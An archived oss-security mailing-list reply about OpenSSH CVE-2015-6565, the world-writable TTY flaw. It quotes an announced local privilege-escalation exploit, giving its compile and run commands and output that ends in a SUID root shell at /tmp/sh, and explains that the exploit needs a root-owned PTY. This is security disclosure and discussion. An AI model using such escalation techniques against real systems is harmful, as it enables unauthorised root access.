X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1728" "Thursday" "26" "January" "2017" "21:52:43" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20170126215243.58355x6p4o9cc7ks@webmail.alunos.dcc.fc.up.pt>" "54" "Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" nil nil nil "1" "2017012620:52:43" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" (number mark "U       up201407890@ Jan 26   54/1728  " thread-indent "\"Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux\"\n") "<CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>" ("<20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>" "<CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1551 invoked by uid 550); 27 Jan 2017 05:36:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22002 invoked from network); 27 Jan 2017 01:11:53 -0000
Message-ID: <20170126215243.58355x6p4o9cc7ks@webmail.alunos.dcc.fc.up.pt>
Date: Thu, 26 Jan 2017 21:52:43 +0100
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com, Noryungi <noryungi@gmail.com>
References: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
	<CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>
In-Reply-To: 	<CAA_Lw39mq10gPSpsFTvCgvug-Ewgjeisj14bDrwvftV-QTeuSg@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain;
	charset=UTF-8;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: Re: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in
	6.8-6.9) can lead to local privesc on Linux

Quoting Noryungi <noryungi@gmail.com>:

The PTY slave must be root owned to get root obviously, for example=20=20
when root logs in via ssh.

> Does not work on centos 7.1 (unpatched) running stock openssh.
>
> TTY capture works, /tmp/sh is created but user is unprivileged.
>
> On Jan 26, 2017 5:52 PM, <up201407890@alunos.dcc.fc.up.pt> wrote:
>
>> Hi list,
>>
>> I know I'm late to the party, but I was bored, so I decided to write an
>> exploit for CVE-2015-6565 which affects OpenSSH 6.8-6.9
>> It is mostly considered to be a "DoS", even though Jann Horn publicly to=
ld
>> how it could be exploited for local privilege escalation, but I guess its
>> either PoC||GTFO for users to update.
>>
>> From https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-6565
>>
>> "sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY
>> devices, which allows local users to cause a denial of service (terminal
>> disruption) or possibly have unspecified other impact by writing to a
>> device, as demonstrated by writing an escape sequence."
>>
>> I think the description should be updated.
>>
>> $ gcc not_an_sshnuke.c -o not_an_sshnuke
>> $ ./not_an_sshnuke /dev/pts/3
>> [*] Waiting for slave device /dev/pts/3
>> [+] Got PTY slave /dev/pts/3
>> [+] Making PTY slave the controlling terminal
>> [+] SUID shell at /tmp/sh
>> $ /tmp/sh --norc --noprofile -p
>> # id
>> euid=3D0(root) groups=3D0(root)
>>
>> Thanks,
>> Federico Bento.
>>
>>
>>
>> ----------------------------------------------------------------
>> This message was sent using IMP, the Internet Messaging Program.
>>
>



----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

